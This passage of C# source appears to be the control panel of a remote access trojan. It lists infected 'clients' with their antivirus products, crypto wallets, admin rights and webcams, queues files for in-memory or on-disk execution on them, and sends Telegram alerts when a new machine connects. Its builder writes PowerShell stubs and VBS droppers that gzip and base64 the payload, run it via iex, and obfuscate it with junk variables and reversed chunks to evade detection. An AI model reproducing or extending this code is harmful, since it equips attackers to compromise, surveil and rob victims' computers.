                _ = LoadNetworkInfoAsync();
            }
        }

        // ==================== NETWORK TAB ====================

        private async Task LoadNetworkInfoAsync()
        {
            try
            {
                networkRefreshButton.IsEnabled = false;

                // Hostname
                networkHostnameText.Text = Environment.MachineName;

                // Public IP
                _ = FetchPublicIpAsync();

                // Local network info
                LoadLocalNetworkInfo();
            }
            finally
            {
                networkRefreshButton.IsEnabled = true;
            }
        }

        private async Task FetchPublicIpAsync()
        {
            try
            {
                using var http = new HttpClient { Timeout = TimeSpan.FromSeconds(10) };
                string ip = await http.GetStringAsync("https://api.ipify.org");
                networkPublicIpText.Text = ip?.Trim() ?? "Unavailable";
            }
            catch
            {
                networkPublicIpText.Text = "Unavailable";
            }
        }

        private void LoadLocalNetworkInfo()
        {
            try
            {
                string localIp = "Unavailable";
                string subnet = "Unavailable";
                string gateway = "Unavailable";
                string dns = "Unavailable";
                string adapterName = "Unavailable";
                string mac = "Unavailable";
                string speed = "Unavailable";

                var adapters = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()
                    .Where(n => n.OperationalStatus == System.Net.NetworkInformation.OperationalStatus.Up
                             && n.NetworkInterfaceType != System.Net.NetworkInformation.NetworkInterfaceType.Loopback)
                    .ToList();

                // Collect all local IPv4 addresses from all active adapters
                var allIps = adapters
                    .SelectMany(n => n.GetIPProperties().UnicastAddresses)
                    .Where(u => u.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    .Select(u => u.Address.ToString())
                    .Distinct()
                    .ToList();
                localIp = allIps.Any() ? string.Join(", ", allIps) : "Unavailable";

                // Pick the adapter with a default gateway for the rest of the fields
                var ni = adapters
                    .OrderByDescending(n =>
                    {
                        var gw = n.GetIPProperties()?.GatewayAddresses;
                        return gw != null && gw.Any(g => g.Address?.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork) ? 1 : 0;
                    })
                    .FirstOrDefault();

                if (ni != null)
                {
                    var ipProps = ni.GetIPProperties();
                    var unicast = ipProps.UnicastAddresses
                        .FirstOrDefault(u => u.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);

                    if (unicast != null)
                        subnet = unicast.IPv4Mask?.ToString() ?? "N/A";

                    var gw = ipProps.GatewayAddresses
                        .FirstOrDefault(g => g.Address?.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);
                    gateway = gw?.Address?.ToString() ?? "None";

                    var dnsList = ipProps.DnsAddresses
                        .Where(d => d.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        .Select(d => d.ToString());
                    dns = dnsList.Any() ? string.Join(", ", dnsList) : "None";

                    adapterName = ni.Name;
                    mac = ni.GetPhysicalAddress()?.ToString();
                    if (!string.IsNullOrEmpty(mac) && mac.Length == 12)
                        mac = string.Join(":", Enumerable.Range(0, 6).Select(i => mac.Substring(i * 2, 2)));

                    speed = ni.Speed > 0 ? FormatSpeed(ni.Speed) : "Unknown";
                }

                networkLocalIpText.Text = localIp;
                networkSubnetText.Text = subnet;
                networkGatewayText.Text = gateway;
                networkDnsText.Text = dns;
                networkAdapterNameText.Text = adapterName;
                networkMacText.Text = mac;
                networkSpeedText.Text = speed;
            }
            catch
            {
                // Keep defaults
            }
        }

        private static string FormatSpeed(long bps)
        {
            if (bps >= 1_000_000_000)
                return $"{bps / 1_000_000_000.0:F1} Gbps";
            if (bps >= 1_000_000)
                return $"{bps / 1_000_000.0:F0} Mbps";
            if (bps >= 1_000)
                return $"{bps / 1_000.0:F0} Kbps";
            return $"{bps} bps";
        }

        private void CopyField_Click(object sender, RoutedEventArgs e)
        {
            if (sender is Button btn && btn.Tag is string name)
            {
                var field = FindName(name) as TextBox;
                if (field != null && !string.IsNullOrEmpty(field.Text))
                {
                    try
                    {
                        Clipboard.SetText(field.Text);
                    }
                    catch { }
                }
            }
        }

        private async void NetworkRefreshButton_Click(object sender, RoutedEventArgs e)
        {
            networkPublicIpText.Text = "Loading...";
            networkHostnameText.Text = "Loading...";
            networkLocalIpText.Text = "Loading...";
            networkSubnetText.Text = "Loading...";
            networkGatewayText.Text = "Loading...";
            networkDnsText.Text = "Loading...";
            networkAdapterNameText.Text = "Loading...";
            networkMacText.Text = "Loading...";
            networkSpeedText.Text = "Loading...";
            await LoadNetworkInfoAsync();
        }

        private void LoadThemeCards()
        {
            var cards = new List<ThemeCardItem>();
            string current = ThemeManager.CurrentTheme;

            var descriptions = new Dictionary<string, string>
            {
                { "Dark", "Default dark theme, easy on the eyes" },
                { "Light", "Clean light theme for daytime use" },
                { "Midnight", "Deep midnight tones with teal accents" },
                { "Hacker", "Classic green-on-black terminal vibe" },
                { "Nord", "Arctic blue palette, cool and calm" },
                { "Dracula", "Dark purple base with vibrant accents" },
                { "Solarized", "Earthy warm tones, low contrast" },
                { "Tokyo Night", "Deep blue night scene with neon pops" },
                { "Monokai", "Bold green and pink, editor classic" },
                { "One Dark", "Atom-inspired, smooth and modern" },
                { "Catppuccin", "Mocha blend, soft pastel accents" }
            };

            foreach (var kvp in ThemeManager.Themes)
            {
                var rd = new ResourceDictionary { Source = new Uri(kvp.Value, UriKind.Relative) };
                cards.Add(new ThemeCardItem
                {
                    Name = kvp.Key,
                    DisplayName = kvp.Key,
                    Description = descriptions.TryGetValue(kvp.Key, out var desc) ? desc : "",
                    IsActive = kvp.Key == current,
                    PrimaryBrush = rd["PrimaryBrush"] as SolidColorBrush,
                    SurfaceBrush = rd["SurfaceBrush"] as SolidColorBrush,
                    BackgroundBrush = rd["BackgroundBrush"] as SolidColorBrush,
                    BorderBrush = rd["BorderBrush"] as SolidColorBrush
                });
            }

            themeCardsPanel.ItemsSource = cards;
            currentThemeLabel.Text = $"Current: {current}";
        }

        private void ThemeCard_Click(object sender, MouseButtonEventArgs e)
        {
            var border = sender as Border;
            if (border?.DataContext is ThemeCardItem card)
            {
                ThemeManager.ApplyTheme(card.Name);
                LoadThemeCards();
                SaveSettings();
            }
        }

        // ==================== KEY GENERATION ====================

        private void GenerateKeyButton_Click(object sender, RoutedEventArgs e)
        {
            var keyBytes = new byte[16];
            RandomNumberGenerator.Fill(keyBytes);
            builderEncryptionKeyTextBox.Text = Convert.ToHexString(keyBytes).ToLower();
            AppendLog("Generated 32-character hex encryption key.");
        }

        // ==================== CONNECTION INDICATOR ====================

        private void UpdateConnectionIndicator(bool listening)
        {
            _isListening = listening;

            Dispatcher.BeginInvoke(() =>
            {
                var fill = listening
                    ? (SolidColorBrush)FindResource("SuccessBrush")
                    : (SolidColorBrush)FindResource("DangerBrush");
                var text = listening ? $"TCP on port {_currentPort}" : "Disconnected";
                var portText = listening ? $"Port: {_currentPort}" : "Port: —";

                if (statusIndicator != null && connectionStatusText != null)
                {
                    statusIndicator.Fill = fill;
                    connectionStatusText.Text = text;
                }
                if (settingsStatusIndicator != null && settingsStatusText != null)
                {
                    settingsStatusIndicator.Fill = fill;
                    settingsStatusText.Text = text;
                }
                if (portLbl != null)
                    portLbl.Text = portText;
            });
        }

        // ==================== CLIENT SELECTION HANDLERS ====================
        // These handlers are referenced from XAML. They must exist even if the
        // named label 'selectedClientCountLbl' is absent from XAML — the update
        // method guards against that with a null check via FindName.

        private void ClientCheckBox_Changed(object sender, RoutedEventArgs e)
        {
            UpdateSelectedClientCount();
        }

        private void ClientList_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            UpdateSelectedClientCount();
        }

        private void SelectAllButton_Click(object sender, RoutedEventArgs e)
        {
            foreach (var client in ClientItems)
                client.IsSelected = true;

            int count = ClientItems.Count;
            UpdateSelectedClientCount();
            AppendLog($"Selected all {count} client(s).");
        }

        private void SelectNoneButton_Click(object sender, RoutedEventArgs e)
        {
            foreach (var client in ClientItems)
                client.IsSelected = false;

            UpdateSelectedClientCount();
            AppendLog("Cleared client selection.");
        }

        private void InvertSelectionButton_Click(object sender, RoutedEventArgs e)
        {
            foreach (var client in ClientItems)
                client.IsSelected = !client.IsSelected;

            int selected = ClientItems.Count(c => c.IsSelected);
            UpdateSelectedClientCount();
            AppendLog($"Inverted selection — {selected} client(s) selected.");
        }

        /// <summary>
        /// Updates the selected-client count label if it exists in XAML.
        /// Uses FindName so it never throws if the label is absent.
        /// </summary>
        private void UpdateSelectedClientCount()
        {
            Dispatcher.BeginInvoke(() =>
            {
                int selected = ClientItems.Count(c => c.IsSelected);
                string text = selected == 1 ? "1 selected" : $"{selected} selected";

                // Use FindName so we never get a compile error if the label
                // does not exist in this XAML file.
                if (FindName("selectedClientCountLbl") is TextBlock lbl)
                    lbl.Text = text;
            });
        }

        // ==================== CLIENT MANAGEMENT ====================

        private void ClientCheckTimer_Tick(object sender, EventArgs e)
        {
            if (_serverStopping || _tcpServer == null) return;

            var now = DateTime.UtcNow;

            var graceExpired = _disconnectGracePeriod
                .Where(kvp => now - kvp.Value > DisconnectGrace)
                .Select(kvp => kvp.Key)
                .ToList();

            foreach (var displayId in graceExpired)
            {
                if (_serverStopping) return;

                string rawId = ResolveRawClientId(displayId);
                if (_tcpServer != null && _tcpServer.IsClientConnected(rawId))
                {
                    _disconnectGracePeriod.TryRemove(displayId, out _);
                    _clientLastSeen[displayId] = DateTime.UtcNow;
                    continue;
                }

                RemoveClientTracking(displayId);
                RemoveClientUI(displayId);
                AppendLog($"Client '{displayId}' removed (grace period expired).");

                // Fire and forget — intentional, plugin cleanup is non-critical
                _ = (_pluginHost?.OnClientDisconnected(displayId) ?? Task.CompletedTask);
                RemovePluginTabsForClient(displayId);
            }

            var timedOut = _clientLastSeen
                .Where(kvp => now - kvp.Value > ClientTimeout && !_disconnectGracePeriod.ContainsKey(kvp.Key))
                .Select(kvp => kvp.Key)
                .ToList();

            foreach (var displayId in timedOut)
            {
                if (_serverStopping) return;

                string rawId = ResolveRawClientId(displayId);

                if (_tcpServer != null && _tcpServer.IsClientConnected(rawId))
                {
                    _clientLastSeen[displayId] = DateTime.UtcNow;
                    continue;
                }

                _disconnectGracePeriod[displayId] = DateTime.UtcNow;
                AppendLog($"Client '{displayId}' timed out — grace period started ({DisconnectGrace.TotalSeconds}s).");
            }
        }

        private void RemoveClientUI(string displayId)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var item = ClientItems.FirstOrDefault(c => c.Name == displayId);
                if (item != null)
                {
                    ClientItems.Remove(item);
                    UpdateClientCount();
                }
            });
        }

        /// <summary>
        /// Adds a client to the UI list. Must be called on the dispatcher thread.
        /// Guards against duplicates.
        /// </summary>
        public void AddClient(string name, ClientInfoData clientInfo, bool isSelected)
        {
            if (_serverStopping) return;

            Dispatcher.BeginInvoke(() =>
            {
                if (_serverStopping) return;

                if (ClientItems.Any(c => c.Name == name))
                    return;

                string resolvedOS = ResolveOSVersion(SanitizeInput(clientInfo.OSVersion, 200));

                ClientItems.Add(new ClientItem(
                    name,
                    resolvedOS,
                    SanitizeInput(clientInfo.MachineName, 100),
                    SanitizeInput(clientInfo.AntivirusProducts, 200),
                    SanitizeInput(clientInfo.CryptoWallet, 200),
                    clientInfo.IsAdmin ?? "Unknown",
                    clientInfo.HasWebcam ?? "Unknown",
                    isSelected));
                UpdateClientCount();
            });
        }

        /// <summary>
        /// Called by TcpServer ONCE during handshake after connection registration.
        /// This is the ONLY path that creates new client UI entries.
        /// </summary>
        public void OnHttpClientInfo(string clientId, string systemInfo)
        {
            if (_serverStopping) return;

            // Intentional fire-and-forget — background work initiated from non-async caller
            _ = Task.Run(async () =>
            {
                try
                {
                    await OnHttpClientInfoAsync(clientId, systemInfo);
                }
                catch (Exception ex)
                {
                    if (!_serverStopping)
                        AppendLog($"Unhandled error in client handler for '{clientId}': {ex.Message}");
                }
            });
        }

        private async Task OnHttpClientInfoAsync(string clientId, string systemInfo)
        {
            if (_serverStopping) return;
            if (string.IsNullOrWhiteSpace(clientId) || string.IsNullOrWhiteSpace(systemInfo))
                return;

            string rawClientId = SanitizeInput(clientId, 64);

            var clientInfo = ParseClientInfo(systemInfo);

            string displayId = AssignDisplayId(rawClientId, clientInfo);
            if (displayId == null) return;

            _clientLastSeen[displayId] = DateTime.UtcNow;
            _disconnectGracePeriod.TryRemove(displayId, out _);

            if (_serverStopping) return;

            string snapshotDisplayId = displayId;
            string snapshotOS, snapshotMachine, snapshotAV, snapshotWallet, snapshotAdmin, snapshotWebcam;

            if (_displayIdClientInfo.TryGetValue(displayId, out var storedInfo))
            {
                snapshotOS = ResolveOSVersion(SanitizeInput(storedInfo.OSVersion, 200));
                snapshotMachine = SanitizeInput(storedInfo.MachineName, 100);
                snapshotAV = SanitizeInput(storedInfo.AntivirusProducts, 200);
                snapshotWallet = SanitizeInput(storedInfo.CryptoWallet, 200);
                snapshotAdmin = storedInfo.IsAdmin ?? "Unknown";
                snapshotWebcam = storedInfo.HasWebcam ?? "Unknown";
            }
            else
            {
                snapshotOS = ResolveOSVersion(SanitizeInput(clientInfo.OSVersion, 200));
                snapshotMachine = SanitizeInput(clientInfo.MachineName, 100);
                snapshotAV = SanitizeInput(clientInfo.AntivirusProducts, 200);
                snapshotWallet = SanitizeInput(clientInfo.CryptoWallet, 200);
                snapshotAdmin = clientInfo.IsAdmin ?? "Unknown";
                snapshotWebcam = clientInfo.HasWebcam ?? "Unknown";
            }

            var tcs = new TaskCompletionSource<bool>();

            Dispatcher.BeginInvoke(() =>
            {
                try
                {
                    if (_serverStopping)
                    {
                        tcs.TrySetResult(false);
                        return;
                    }

                    var existing = ClientItems.FirstOrDefault(c => c.Name == snapshotDisplayId);

                    if (existing == null)
                    {
                        if (ClientItems.Any(c => c.Name == snapshotDisplayId))
                        {
                            tcs.TrySetResult(false);
                            return;
                        }

                        ClientItems.Add(new ClientItem(
                            snapshotDisplayId,
                            snapshotOS,
                            snapshotMachine,
                            snapshotAV,
                            snapshotWallet,
                            snapshotAdmin,
                            snapshotWebcam,
                            false));
                        UpdateClientCount();

                        AppendLog($"Client connected: {snapshotDisplayId} ({snapshotMachine})");
                        tcs.TrySetResult(true);
                    }
                    else
                    {
                        existing.OSVersion = snapshotOS;
                        existing.MachineName = snapshotMachine;
                        existing.AntivirusProducts = snapshotAV;
                        existing.CryptoWallet = snapshotWallet;
                        tcs.TrySetResult(false);
                    }
                }
                catch (Exception ex)
                {
                    tcs.TrySetException(ex);
                }
            });

            bool isNewClient = await tcs.Task;

            if (isNewClient && !_serverStopping)
            {
                _ = SendTelegramNotification($"New client connected: {snapshotDisplayId} ({snapshotMachine})");
                await Task.Delay(1000);
                if (!_serverStopping)
                    await ExecuteAutoTasksForClient(displayId);
            }
        }

        /// <summary>
        /// Called by TcpServer when MSG_CLIENT_INFO arrives during an active session.
        /// ONLY updates existing client fields — NEVER creates new entries.
        /// </summary>
        public void OnClientInfoUpdate(string rawClientId, string systemInfo)
        {
            if (_serverStopping) return;
            if (string.IsNullOrWhiteSpace(rawClientId) || string.IsNullOrWhiteSpace(systemInfo))
                return;

            string safeRawId = SanitizeInput(rawClientId, 64);

            if (!_rawToDisplayId.TryGetValue(safeRawId, out string displayId))
                return;

            var clientInfo = ParseClientInfo(systemInfo);

            _displayIdClientInfo[displayId] = new ClientInfoData
            {
                OSVersion = clientInfo.OSVersion ?? "",
                MachineName = clientInfo.MachineName ?? "",
                AntivirusProducts = clientInfo.AntivirusProducts ?? "",
                CryptoWallet = clientInfo.CryptoWallet ?? "",
                IsAdmin = clientInfo.IsAdmin ?? "Unknown",
                HasWebcam = clientInfo.HasWebcam ?? "Unknown"
            };

            _clientLastSeen[displayId] = DateTime.UtcNow;
            _disconnectGracePeriod.TryRemove(displayId, out _);

            string targetDisplayId = displayId;
            string resolvedOS = ResolveOSVersion(SanitizeInput(clientInfo.OSVersion, 200));
            string machine = SanitizeInput(clientInfo.MachineName, 100);
            string av = SanitizeInput(clientInfo.AntivirusProducts, 200);
            string wallet = SanitizeInput(clientInfo.CryptoWallet, 200);
            string admin = clientInfo.IsAdmin ?? "Unknown";
            string webcam = clientInfo.HasWebcam ?? "Unknown";

            Dispatcher.BeginInvoke(() =>
            {
                if (_serverStopping) return;

                var existing = ClientItems.FirstOrDefault(c => c.Name == targetDisplayId);
                if (existing != null)
                {
                    existing.OSVersion = resolvedOS;
                    existing.MachineName = machine;
                    existing.AntivirusProducts = av;
                    existing.CryptoWallet = wallet;
                    existing.IsAdmin = admin;
                    existing.HasWebcam = webcam;
                }
            });
        }

        /// <summary>
        /// Called by TcpServer when MSG_ACTIVE_WINDOW arrives.
        /// </summary>
        public void OnActiveWindowUpdate(string rawClientId, string windowTitle)
        {
            if (_serverStopping) return;
            if (string.IsNullOrWhiteSpace(rawClientId)) return;

            if (!_rawToDisplayId.TryGetValue(rawClientId, out string displayId))
                return;

            string title = SanitizeInput(windowTitle, 500);

            Dispatcher.BeginInvoke(() =>
            {
                if (_serverStopping) return;
                var existing = ClientItems.FirstOrDefault(c => c.Name == displayId);
                if (existing != null)
                    existing.ActiveWindow = title;
            });
        }

        /// <summary>
        /// Parses a pipe or semicolon delimited system info string.
        /// </summary>
        private static ClientInfoData ParseClientInfo(string systemInfo)
        {
            string[] parts;
            if (systemInfo.Contains('|'))
                parts = systemInfo.Split('|');
            else
                parts = systemInfo.Split(';');

            return new ClientInfoData
            {
                OSVersion = parts.Length > 0 ? parts[0].Trim() : "Unknown",
                MachineName = parts.Length > 1 ? parts[1].Trim() : "Unknown",
                AntivirusProducts = parts.Length > 2 ? parts[2].Trim() : "",
                CryptoWallet = parts.Length > 3 ? parts[3].Trim() : "",
                IsAdmin = parts.Length > 4 ? parts[4].Trim() : "Unknown",
                HasWebcam = parts.Length > 5 ? parts[5].Trim() : "Unknown"
            };
        }

        public void OnClientDisconnected(string clientId)
        {
            if (_serverStopping) return;

            if (string.IsNullOrWhiteSpace(clientId)) return;

            string safeClientId = SanitizeInput(clientId, 64);
            string displayId = ResolveStableClientId(safeClientId);

            if (displayId == safeClientId && !_rawToDisplayId.ContainsKey(safeClientId))
                return;

            if (!_disconnectGracePeriod.ContainsKey(displayId))
            {
                _disconnectGracePeriod[displayId] = DateTime.UtcNow;
                RemoveClientTracking(displayId);
                RemoveClientUI(displayId);
                _ = (_pluginHost?.OnClientDisconnected(displayId) ?? Task.CompletedTask);
                RemovePluginTabsForClient(displayId);
            }
        }

        // ==================== INPUT SANITIZATION ====================

        private static string SanitizeInput(string input, int maxLength)
        {
            if (string.IsNullOrEmpty(input)) return "";
            string sanitized = input.Trim();
            if (sanitized.Length > maxLength)
                sanitized = sanitized.Substring(0, maxLength);
            sanitized = new string(sanitized.Where(c => !char.IsControl(c)).ToArray());
            return sanitized;
        }

        // ==================== SERVER CONTROL ====================

        private void BtnListenToggle_Click(object sender, RoutedEventArgs e)
        {
            if (_isListening)
            {
                StopServer();
            }
            else
            {
                StartServer();
            }
        }

        private void StartServer()
        {
            if (!int.TryParse(listenportTextBox.Text, out int port) || port <= 0 || port > 65535)
            {
                AppendLog("Please enter a valid port number (1-65535).");
                return;
            }

            if (_serverCertificate == null)
            {
                AppendLog("Server certificate is not loaded. Please set up a certificate first.");
                return;
            }

            _currentPort = port;
            _serverStopping = false;

            SaveSettings();

            try
            {
                string serverPwd = HttpPasswordBox?.Password?.Trim() ?? "";
                _tcpServer = new TcpServer(this, port, _serverCertificate, serverPwd);

                _tcpServer.SetPluginHost(_pluginHost);
                _pluginHost.SetTcpServer(_tcpServer);

                _tcpServer.Start();

                listenportTextBox.IsReadOnly = true;
                UpdateListenToggleState(true);
                UpdateConnectionIndicator(true);
                UpdateStatus($"TCP listening on port {port} (AES-256-CBC+HMAC)");
            }
            catch (Exception ex)
            {
                AppendLog($"Failed to start server: {ex.Message}");
            }
        }

        private void StopServer()
        {
            _serverStopping = true;

            _pluginHost?.SetTcpServer(null);

            _tcpServer?.Stop();
            _tcpServer?.Dispose();
            _tcpServer = null;

            Task.Delay(200).ContinueWith(_ =>
            {
                Dispatcher.BeginInvoke(() =>
                {
                    ClearAllClientState();

                    listenportTextBox.IsReadOnly = false;
                    UpdateListenToggleState(false);
                    UpdateConnectionIndicator(false);
                    AppendLog("Server stopped. All clients removed.");
                    UpdateStatus("Stopped.");
                });
            });
        }

        private void UpdateListenToggleState(bool listening)
        {
            if (btnListenToggle == null) return;
            if (listening)
            {
                btnListenToggle.Content = "⏹ Stop Listening";
                btnListenToggle.Style = (Style)FindResource("DangerButton");
            }
            else
            {
                btnListenToggle.Content = "▶ Start Listening";
                btnListenToggle.Style = (Style)FindResource("SuccessButton");
            }
        }

        private void SetPasswordButton_Click(object sender, RoutedEventArgs e)
        {
            string password = HttpPasswordBox.Password.Trim();
            if (string.IsNullOrWhiteSpace(password))
            {
                AppendLog("Please enter a password.");
                return;
            }

            if (password.Length < 12)
            {
                AppendLog("Password must be at least 12 characters.");
                return;
            }

            SaveSettings();
            AppendLog("Password saved. Note: TLS certificate authentication replaces legacy password auth.");
            UpdateStatus("Password saved.");
        }

        private void RefreshButton_Click(object sender, RoutedEventArgs e)
        {
            if (_tcpServer != null)
            {
                int count = _tcpServer.ConnectedClientCount;
                UpdateStatus($"{count} client(s) connected via TCP.");
            }
            else
            {
                UpdateStatus("Server not running.");
            }
        }

        private void SearchButton_Click(object sender, RoutedEventArgs e)
        {
            string searchTerm = _searchTextBox?.Text ?? "";
            if (string.IsNullOrWhiteSpace(searchTerm))
            {
                clientList.ItemsSource = ClientItems;
                AppendLog("Search cleared.");
            }
            else
            {
                var filtered = ClientItems.Where(c =>
                    c.Name.IndexOf(searchTerm, StringComparison.OrdinalIgnoreCase) >= 0 ||
                    c.OSVersion.IndexOf(searchTerm, StringComparison.OrdinalIgnoreCase) >= 0 ||
                    c.MachineName.IndexOf(searchTerm, StringComparison.OrdinalIgnoreCase) >= 0 ||
                    c.AntivirusProducts.IndexOf(searchTerm, StringComparison.OrdinalIgnoreCase) >= 0 ||
                    c.CryptoWallet.IndexOf(searchTerm, StringComparison.OrdinalIgnoreCase) >= 0
                ).ToList();

                clientList.ItemsSource = filtered;
                AppendLog($"Found {filtered.Count} match(es) for '{SanitizeInput(searchTerm, 50)}'.");
            }
        }

        // ==================== FILE OPERATIONS ====================

        private void SelectFileButton_Click(object sender, RoutedEventArgs e)
        {
            _selectedFilePath = FileSelector.SelectFile(logTextBox);
            UpdateLastFileLabel();
            UpdateExecutionModeIndicator();
        }

        private void SendFileButton_Click(object sender, RoutedEventArgs e)
        {
            var selectedClients = ClientItems.Where(c => c.IsSelected).ToList();

            if (string.IsNullOrEmpty(_selectedFilePath))
            {
                AppendLog("Please select a file first.");
                return;
            }

            if (!File.Exists(_selectedFilePath))
            {
                AppendLog("Selected file no longer exists.");
                _selectedFilePath = null;
                UpdateLastFileLabel();
                return;
            }

            var fileInfo = new FileInfo(_selectedFilePath);
            if (fileInfo.Length > 50 * 1024 * 1024)
            {
                AppendLog("File exceeds 50MB limit.");
                return;
            }

            if (selectedClients.Count == 0)
            {
                AppendLog("No clients selected.");
                return;
            }

            if (_tcpServer == null)
            {
                AppendLog("Server is not running. Start the server first.");
                return;
            }

            var execMode = GetSelectedExecutionMode();

            if (execMode == ExecutionMode.InMemory)
            {
                if (!ValidateInMemoryCompatibility(_selectedFilePath))
                {
                    AppendLog("File is not compatible with in-memory execution.");
                    return;
                }
            }

            string fileHash = ComputeFileHash(_selectedFilePath);
            string modeStr = execMode == ExecutionMode.InMemory ? "IN-MEMORY" : "DROP-TO-DISK";

            foreach (var client in selectedClients)
            {
                string sendId = ResolveRawClientId(client.Name);
                _tcpServer.EnqueueFileForClient(sendId, _selectedFilePath, fileHash, execMode);
                AppendLog($"[{modeStr}] File queued for {client.Name}: {fileInfo.Name} (SHA256: {fileHash.Substring(0, 16)}...)");
            }

            UpdateLastFileLabel();
        }

        private void UpdateExecutionModeIndicator()
        {
            Dispatcher.BeginInvoke(() =>
            {
                var mode = GetSelectedExecutionMode();
                bool inMemory = mode == ExecutionMode.InMemory;

                if (ctxDropToDisk != null)
                    ctxDropToDisk.IsChecked = !inMemory;
                if (ctxInMemory != null)
                    ctxInMemory.IsChecked = inMemory;
            });
        }

        private void CtxExecMode_Click(object sender, RoutedEventArgs e)
        {
            if (sender == ctxInMemory)
                SetSelectedExecutionMode(ExecutionMode.InMemory);
            else
                SetSelectedExecutionMode(ExecutionMode.DropToDisk);
        }

        private static string ComputeFileHash(string filePath)
        {
            using var sha256 = SHA256.Create();
            using var stream = File.OpenRead(filePath);
            byte[] hash = sha256.ComputeHash(stream);
            return BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
        }

        // ==================== BUILDER (PS1 + EXE) ====================

        private void BuilderGenerateButton_Click(object sender, RoutedEventArgs e)
        {
            UpdateStatus("Generating stub...");
            builderOutputTextBox.Text = "Ready to generate stub...";

            string port = builderPortTextBox.Text.Trim();
            string password = builderPasswordBox.Text.Trim();
            string serverIp = builderIpTextBox.Text.Trim();
            string encKey = builderEncryptionKeyTextBox.Text.Trim();

            if (!ValidateBuilderInputs())
            {
                BuilderOutput("ERROR: Validation failed — check inputs");
                UpdateStatus("Stub generation failed.");
                return;
            }

            SaveSettings();

            bool silentMode = builderSilentCheckBox?.IsChecked == true;
            BuilderOutput($"Generating PS1 stub — {serverIp}:{port} (silent={silentMode})");

            string stubCode = GenerateStubCode(port, password, serverIp, encKey, silentMode);

            if (stubCode.StartsWith("# Template"))
            {
                BuilderOutput("ERROR: Stub generation failed — template not found");
                UpdateStatus("Stub generation failed.");
                return;
            }

            BuilderOutput($"Stub generated ({stubCode.Length} chars)");

            var dialog = new SaveFileDialog
            {
                Filter = "PowerShell script (*.ps1)|*.ps1",
                DefaultExt = ".ps1",
                FileName = "Stub.ps1"
            };

            if (dialog.ShowDialog() == true)
            {
                File.WriteAllText(dialog.FileName, stubCode);
                AppendLog($"Stub saved to {dialog.FileName}");
                BuilderOutput($"Saved: {dialog.FileName}");
                UpdateStatus("Stub generated and saved.");
            }
            else
            {
                BuilderOutput("Save cancelled.");
                UpdateStatus("Stub generated (not saved).");
            }
        }

        private void GenerateVbsButton_Click(object sender, RoutedEventArgs e)
        {
            UpdateStatus("Generating VBS stub...");
            builderOutputTextBox.Text = "Ready to generate stub...";

            string port = builderPortTextBox.Text.Trim();
            string password = builderPasswordBox.Text.Trim();
            string serverIp = builderIpTextBox.Text.Trim();
            string encKey = builderEncryptionKeyTextBox.Text.Trim();

            if (!ValidateBuilderInputs())
            {
                BuilderOutput("ERROR: Validation failed — check inputs");
                UpdateStatus("VBS stub generation failed.");
                return;
            }

            SaveSettings();

            bool silentMode = builderSilentCheckBox?.IsChecked == true;
            BuilderOutput($"Generating VBS stub — {serverIp}:{port} (silent={silentMode})");

            string vbsCode = GenerateVbsCode(port, password, serverIp, encKey, silentMode);

            if (vbsCode.StartsWith("' ERROR"))
            {
                BuilderOutput("ERROR: VBS stub generation failed — template not found");
                UpdateStatus("VBS stub generation failed.");
                return;
            }

            BuilderOutput($"VBS stub generated ({vbsCode.Length} chars)");

            var dialog = new SaveFileDialog
            {
                Filter = "VBScript file (*.vbs)|*.vbs",
                DefaultExt = ".vbs",
                FileName = "Stub.vbs"
            };

            if (dialog.ShowDialog() == true)
            {
                File.WriteAllText(dialog.FileName, vbsCode);
                AppendLog($"VBS stub saved to {dialog.FileName}");
                BuilderOutput($"Saved: {dialog.FileName}");
                UpdateStatus("VBS stub generated and saved.");
            }
            else
            {
                BuilderOutput("Save cancelled.");
                UpdateStatus("VBS stub generated (not saved).");
            }
        }

        private string GenerateVbsCode(string port, string password, string serverIp, string encryptionKey, bool silentMode = false)
        {
            string ps1Code = GenerateStubCode(port, password, serverIp, encryptionKey, silentMode);
            if (ps1Code.StartsWith("# Template"))
            {
                AppendLog("ERROR: Cannot generate VBS — PS1 stub generation failed.");
                return "' ERROR: PS1 stub generation failed.";
            }

            byte[] ps1Bytes = Encoding.UTF8.GetBytes(ps1Code);
            using var ms = new MemoryStream();
            using (var gz = new GZipStream(ms, CompressionMode.Compress, true))
                gz.Write(ps1Bytes, 0, ps1Bytes.Length);
            byte[] compressed = ms.ToArray();
            string b64Compressed = Convert.ToBase64String(compressed);

            string psCmd = "$b=[Convert]::FromBase64String('" + b64Compressed + "');$ms=[IO.MemoryStream]::new($b);$gz=[IO.Compression.GzipStream]::new($ms,[IO.Compression.CompressionMode]::Decompress);iex([IO.StreamReader]::new($gz).ReadToEnd())";

            AppendLog($"PS1 compressed: {ps1Bytes.Length} -> {compressed.Length} bytes ({(double)compressed.Length / ps1Bytes.Length * 100:F1}%)");
            AppendLog($"VBS payload: {psCmd.Length} chars");

            return GenerateObfuscatedVbs(psCmd);
        }

        private static string GenerateObfuscatedVbs(string b64Payload)
        {
            var rng = new Random();
            var sb = new StringBuilder();

            string VarName() => "x" + Guid.NewGuid().ToString("N").Substring(0, rng.Next(6, 10));

            // ---- junk at top ----
            int junkCount = rng.Next(3, 6);
            for (int i = 0; i < junkCount; i++)
            {
                string jv = VarName();
                sb.AppendLine($"Dim {jv}: {jv} = {rng.Next(100, 9999)} * {rng.Next(2, 99)}");
            }

            // ---- split b64 into chunks and reverse each ----
            int chunkCount = rng.Next(4, 8);
            int chunkSize = (int)Math.Ceiling((double)b64Payload.Length / chunkCount);
            var chunkVars = new List<string>();

            for (int i = 0; i < chunkCount; i++)
            {
                int start = i * chunkSize;
                if (start >= b64Payload.Length) break;
                int len = Math.Min(chunkSize, b64Payload.Length - start);
                string chunk = b64Payload.Substring(start, len);
                char[] rev = chunk.ToCharArray(); Array.Reverse(rev);
                string vn = VarName();
                chunkVars.Add(vn);
                sb.AppendLine($"Dim {vn}: {vn} = \"{new string(rev)}\"");
            }

            // ---- junk interleave ----
            for (int i = 0; i < 2; i++)
            {
                string jv = VarName();
                sb.AppendLine($"Dim {jv}: {jv} = \"{Guid.NewGuid().ToString("N").Substring(0, 8)}\"");
            }

